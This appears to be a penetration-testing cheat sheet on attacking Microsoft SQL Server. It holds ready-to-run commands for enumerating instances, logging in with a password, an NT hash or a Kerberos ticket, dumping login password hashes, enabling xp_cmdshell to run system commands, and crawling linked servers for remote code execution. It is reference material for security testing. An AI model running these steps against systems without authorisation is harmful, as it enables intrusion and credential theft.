---
label: MSSQL Abuse
---

# MSSQL Abuse

## MSSQL Authentication

There are two options of authentication settings possible to set in SQL Server:

1. Windows Authentication
2. Windows Authentication + SQL Server Authentication (mixed)

**SQL Server Authentication** involves setting up a classic login and password for the user's DB. During setup the default `sa` account is created and password must be set. The explicitly provided user’s credentials are validated through the information stored in the master database. It's way more limited than Windows Authentication and it's not recommended approach.

In **Windows authentication**, the user should first authenticate himself within AD domain. SQL Server authenticates users through the Windows security token. It doesn't require to provide credentials explicitly. Windows Authentication is the **default authentication method** when an SQL Server is installed.

{/*TODO: sa vs dbo accounts vs MSSQL Service Account*/}

## Enumeration

Windows (PowerUpSQL module):

```powershell
# Enumerate SQL servers in the current domain
Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose

# Enumerate local SQL instances
Get-SQLInstanceLocal | Get-SQLServerInfo
```

Linux:

```bash
# Ask for SQL instances running on the target host
impacket-mssqlinstance $target_host
```

## Connection

After connecting to MSSQL Server, we are able to execute SQL Queries. This often involves the ability to execute code on the system. [Full list of further exploitation here](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server).

> **NOTE**: It might be worth to check different domain credentials to verify which account has access to MSSQL Server.

Windows (PowerUpSQL module):

```powershell
# Execute SQL query using SQL Server Auth
Get-SQLQuery -Username $user -Password $password -Instance $SQL_Server_FQDN -Query "$mssql_query"

# Execute SQL query using Windows Auth
Get-SQLQuery -Instance $SQL_Server_FQDN -Query "$mssql_query"
```

Linux:

```bash
# Using SQL Server Authentication
impacket-mssqlclient $user:$password@$host

# Using Windows Auth with password
impacket-mssqlclient -windows-auth $domain/$user:$password@$host

# Using Windows Auth with NT hash
impacket-mssqlclient -windows-auth $domain/$user@$host -hashes :$nt_hash

# Using Kerberos TGT
export KRB5CCNAME=$tgt_ccache_file
impacket-mssqlclient $hostname -k -no-pass -dc-ip $dc_ip
```

## Basic queries

```bash
# Show current DB user
select user_name();

# Show databases. Default: master, model, msdb, tempdb
select name from sys.databases;

# Switch database context
use $db;

# Show all tables from database
select table_name from information_schema.tables;

# Show all DB users (SQL_LOGIN type)
select sp.name as login, sp.type_desc as login_type, sl.password_hash, sp.create_date, sp.modify_date, sp.is_disabled from sys.server_principals sp left join sys.sql_logins sl on sp.principal_id = sl.principal_id order by sp.name
```

## Security checks

```bash
# Perform multiple security checks (credentials required)
msfconsole
> use admin/mssql/mssql_enum
```

## Command Exection

Functions like `xp_cmdshell` are disabled in Microsoft SQL Server by default. If a user has appropriate permission, it can enable these features.

```sql
-- Reconfigure MSSQL settings
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECUTE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;

-- Execute command
EXECUTE xp_cmdshell 'whoami';
```

## Linked servers

Any user regardless of their privilege level is allowed to use the preconfigured database links.

Windows (PowerUpSQL module):

```powershell
# Enumerate database links
Get-SQLServerLinkCrawl -Instance $SQL_Server_FQDN -Verbose

# RCE with Windows Auth (current security contex)
Get-SQLServerLinkCrawl -Instance $SQL_Server_FQDN -Query "exec master..xp_cmdshell 'whoami'"

# RCE with SQL Server Auth
Get-SQLServerLinkCrawl -Instance $SQL_Server_FQDN -Username $username $password $password -Query "exec master..xp_cmdshell 'whoami'"


Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select * from openquery(""sql2.domain.io"", 'select * from information_schema.tables')"
```

Linux:

```bash
msfconsole
> use exploit/windows/mssql/mssql_linkcrawler
> set rhost $SQL_Server_IP
> set username $username
> set password $password
```

{/*TODO: SVC hash stealing*/}

## References

- [Netspi, *SQL Server – Link… Link… Link… and Shell: How to Hack Database Links in SQL Server!*](https://www.netspi.com/blog/technical/network-penetration-testing/how-to-hack-database-links-in-sql-server/)
- [Quest, *SQL Server authentication vs. Windows authentication: Which to use and when*](https://blog.quest.com/sql-server-authentication-vs-windows-authentication-which-to-use-and-when/)
